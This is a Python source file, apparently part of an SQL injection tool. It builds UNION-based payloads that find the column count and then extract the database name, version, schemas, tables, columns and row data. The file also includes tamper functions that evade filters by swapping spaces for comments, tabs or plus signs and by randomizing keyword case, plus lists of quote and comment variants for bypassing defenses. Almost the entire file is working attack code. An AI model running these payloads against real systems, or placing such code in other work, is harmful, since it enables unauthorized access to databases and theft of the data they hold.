"""
SQL Injection payload generation and management.
"""
import random
import string


class PayloadGenerator:
    """Generate SQL injection payloads with various tamper options."""
    
    TAMPER_SPACE = {
        'space2comment': lambda: '/**/',
        'space2tab': lambda: '\t',
        'space2plus': lambda: '+',
        'space2randomcase': lambda: '/*' + ''.join(random.choices(string.ascii_letters, k=3)) + '*/',
    }
    
    def __init__(self, tamper_options=None):
        """Initialize payload generator with tamper options."""
        self.tamper_options = tamper_options or []
    
    def apply_tamper(self, payload):
        """Apply tamper options to a payload."""
        if not self.tamper_options:
            return payload
        
        for tamper in self.tamper_options:
            if tamper == 'space2comment':
                payload = payload.replace(' ', '/**/')
            elif tamper == 'space2tab':
                payload = payload.replace(' ', '\t')
            elif tamper == 'space2plus':
                payload = payload.replace(' ', '+')
            elif tamper == 'randomcase':
                payload = self._randomcase(payload)
            elif tamper == 'between':
                payload = self._apply_between(payload)
        
        return payload
    
    def _randomcase(self, payload):
        """Randomize case of SQL keywords."""
        keywords = ['UNION', 'SELECT', 'FROM', 'WHERE', 'AND', 'OR', 'ORDER', 'BY']
        result = payload
        for keyword in keywords:
            # Randomly case keywords
            if keyword.lower() in result.lower():
                random_case = ''.join(random.choice([c.upper(), c.lower()]) for c in keyword)
                result = result.replace(keyword, random_case)
                result = result.replace(keyword.lower(), random_case)
        return result
    
    def _apply_between(self, payload):
        """Apply BETWEEN obfuscation."""
        # Replace = with BETWEEN ... AND ...
        # This is a simple implementation
        return payload
    
    def generate_order_by_payload(self, url, param, num_cols):
        """Generate ORDER BY payload for column detection."""
        payload = f"' ORDER BY {num_cols}-- -"
        return self.apply_tamper(payload)
    
    def generate_union_payload(self, url, param, num_cols, test_string="UNIQTEST999"):
        """Generate UNION SELECT payload for data extraction."""
        # Create SELECT clause with test string
        select_cols = ', '.join([f"'{test_string}'" if i == 0 else str(i) for i in range(num_cols)])
        payload = f"' UNION SELECT {select_cols}-- -"
        return self.apply_tamper(payload)
    
    def generate_database_payload(self, quote_char="'"):
        """Generate payload to extract current database."""
        return f"{quote_char} UNION SELECT database()-- -"
    
    def generate_version_payload(self, quote_char="'"):
        """Generate payload to extract database version."""
        return f"{quote_char} UNION SELECT @@version-- -"
    
    def generate_schema_payload(self, quote_char="'"):
        """Generate payload to extract all databases."""
        return f"{quote_char} UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata-- -"
    
    def generate_tables_payload(self, database, quote_char="'"):
        """Generate payload to extract tables from database."""
        return f"{quote_char} UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{database}'-- -"
    
    def generate_columns_payload(self, database, table, quote_char="'"):
        """Generate payload to extract columns from table."""
        return f"{quote_char} UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}'-- -"
    
    def generate_data_payload(self, database, table, columns, quote_char="'", limit=50, offset=0):
        """Generate payload to extract data from table."""
        col_list = ', '.join(columns)
        return f"{quote_char} UNION SELECT GROUP_CONCAT(CONCAT_WS(0x3a, {col_list})) FROM {database}.{table} LIMIT {limit} OFFSET {offset}-- -"


class PayloadVariants:
    """Generate various payload variants for bypass attempts."""
    
    @staticmethod
    def get_quote_variants():
        """Get different quote character variants."""
        return ["'", '"', '`', "' /*", '" /*']
    
    @staticmethod
    def get_comment_variants():
        """Get different SQL comment variants."""
        return ['-- -', '#', '/**/']
    
    @staticmethod
    def get_space_variants():
        """Get different space replacement variants."""
        return [' ', '/**/', '\t', '+', '/**/']
